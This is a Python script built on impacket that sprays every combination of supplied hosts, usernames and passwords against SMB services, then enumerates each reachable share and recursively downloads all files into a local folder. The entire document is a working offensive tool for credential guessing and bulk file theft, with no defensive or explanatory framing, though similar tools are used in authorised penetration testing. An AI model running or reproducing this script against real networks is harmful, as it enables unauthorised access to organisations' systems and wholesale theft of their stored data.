#!/usr/bin/python3

import os
import argparse
import sys
from impacket.smbconnection import SMBConnection
import itertools

def list_shares(smb_connection):
    """
    List all the shares available on the connected SMB host.
    """
    try:
        shares = smb_connection.listShares()
        share_names = [share['shi1_netname'][:-1] for share in shares]
        return share_names
    except Exception as e:
        print(f"Error listing shares: {e}")
        return []

def list_files(smb_connection, share_name, base_path='\\'):
    """
    List all files and directories recursively in the given share.
    """
    try:
        # List files in the provided base path of the share
        files = smb_connection.listPath(share_name, base_path + '*')
        return files
    except Exception as e:
        print(f"Error listing files in share {share_name}: {e}")
        return []

def download_file(smb_connection, share_name, remote_path, local_path):
    """
    Download a file from an SMB share to a local path.
    """
    try:
        # Ensure the local directory exists
        os.makedirs(os.path.dirname(local_path), exist_ok=True)
        
        # Download the file from the SMB share
        with open(local_path, 'wb') as file_handle:
            smb_connection.getFile(share_name, remote_path, file_handle.write)
        print(f"Downloaded: {remote_path} to {local_path}")
    except Exception as e:
        print(f"Error downloading file {remote_path}: {e}")

def spider_smb_shares(host, username, password):
    """
    Connect to SMB shares using given credentials, spider all files, and download them.
    """
    try:
        # Connect to the host via SMB with a timeout of 5 seconds
        smb_connection = SMBConnection(host, host, timeout=5)
        smb_connection.login(username, password)
        
        # List shares
        shares = list_shares(smb_connection)
        
        if not shares:
            print(f"No shares found on host {host} with user {username}.")
            return
        
        # Create a directory for the host under the output folder
        host_directory = os.path.join('output', host)
        os.makedirs(host_directory, exist_ok=True)
        
        # Spider each share and download files
        for share in shares:
            print(f"Listing files in share '{share}' on host '{host}':")
            share_directory = os.path.join(host_directory, share)
            os.makedirs(share_directory, exist_ok=True)

            # Recursively list and download files
            spider_files(smb_connection, share, '', share_directory)

        smb_connection.logoff()
    except Exception as e:
        print(f"Error connecting to host {host} with user {username}: {e}")

def spider_files(smb_connection, share_name, remote_path, local_base_path):
    """
    Recursively spider and download files from an SMB share.
    """
    files = list_files(smb_connection, share_name, remote_path)
    for file in files:
        filename = file.get_longname()
        if filename in ['.', '..']:
            continue  # Skip current and parent directory

        full_remote_path = os.path.join(remote_path, filename).replace("\\", "/")
        local_path = os.path.join(local_base_path, full_remote_path.lstrip('\\'))

        if file.is_directory():
            # Recursively create directory and list contents
            os.makedirs(local_path, exist_ok=True)
            spider_files(smb_connection, share_name, full_remote_path + '\\', local_base_path)
        else:
            # Download file
            download_file(smb_connection, share_name, full_remote_path, local_path)

def main():
    parser = argparse.ArgumentParser(
        description='Spider SMB shares using a list of hosts, usernames, and passwords.'
    )
    parser.add_argument('-H', '--hosts', required=True, help='File containing list of hosts')
    parser.add_argument('-U', '--usernames', required=True, help='File containing list of usernames')
    parser.add_argument('-P', '--passwords', required=True, help='File containing list of passwords')

    # Check if no arguments are provided
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    # Read lists from files
    with open(args.hosts, 'r') as hf, open(args.usernames, 'r') as uf, open(args.passwords, 'r') as pf:
        hosts = [line.strip() for line in hf]
        usernames = [line.strip() for line in uf]
        passwords = [line.strip() for line in pf]
    
    # Iterate through all combinations of hosts, usernames, and passwords
    for host, username, password in itertools.product(hosts, usernames, passwords):
        print(f"Trying host {host} with user {username}...")
        spider_smb_shares(host, username, password)

if __name__ == "__main__":
    main()
